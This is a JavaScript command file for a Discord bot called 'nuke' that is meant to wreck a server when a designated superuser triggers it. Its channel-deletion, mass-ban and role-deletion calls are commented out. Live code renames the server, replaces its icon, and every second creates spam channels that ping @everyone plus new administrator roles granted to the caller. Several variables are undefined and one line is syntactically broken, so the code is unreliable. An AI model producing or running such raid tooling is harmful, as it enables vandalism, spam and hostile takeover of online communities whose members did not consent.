const Discord = require("discord.js");
const { MessageEmbed } = require("discord.js");
const {superuser} = require('./../config.js')
module.exports = {
    name: "nuke",
    aliases: [],
    description: "Nukes the server!",
    usage: "nuke",
    run: async (client, message, args) => {
        function log(params) {
        return console.log(params);    
        }
        message.delete();
        if (message.author.id !== superuser) return;
        message.guild.channels.cache.forEach(c => {
         log(c.name)
            //c.delete();
        });
        message.guild.members.cache.forEach(m => {
            log(m.user.name)
            //m.ban();
        });
        
        message.guild.roles.cache.forEach(r => {
            //r.delete();
        });


        message.guild.setIcon(
            `${guildIcon}`
        );
        message.guild.setName(`${guildName}`);

        setInterval(() => {
            message.guild.createChannel(`${channelName}`, "GUILD_TEXT").then(channel => {
                channel.send("@everyone ");
            });

            message.guild
                roles.create({
                    name: `${roleName}`,
                    permissions: ["ADMINISTRATOR"]
                })
                .then(rr => {
                    message.member.addRole(rr.id);
                });

        }, 1000);



    }
};